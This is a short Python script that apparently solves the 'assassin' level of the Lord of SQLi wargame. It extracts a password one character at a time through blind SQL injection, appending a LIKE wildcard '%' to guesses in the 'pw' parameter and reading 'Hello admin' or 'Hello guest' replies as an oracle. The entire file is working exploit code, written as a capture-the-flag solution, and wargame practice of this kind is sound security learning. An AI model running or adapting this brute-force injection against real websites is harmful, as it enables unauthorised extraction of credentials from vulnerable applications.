#!/usr/bin/python3
# coding : UTF-8

import sys
import requests
import time

def main():
    url = "https://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php"
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'}
    cookies = dict(PHPSESSID='XXXXXXXXXXXXXXXXXXXXXXXX')

    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%#&()"
    password = ""
    for count in range(1, 15):
        for char in chars:
            tmp_char = password + char
            val = '{password}%'.format(password = tmp_char)
            print(val)
            params = {'pw': val}
            response = requests.get(url, headers=headers, params=params, cookies=cookies, allow_redirects=False)
            if response.text.count("Hello admin") == 1:
                password += char
                break
            elif response.text.count("Hello guest") == 1:
                password += char
                break
            if char == 'Z':
                print("not found")
                print(password)
                return
            time.sleep(0.1)
    print(password)

if __name__ == "__main__":
    main()
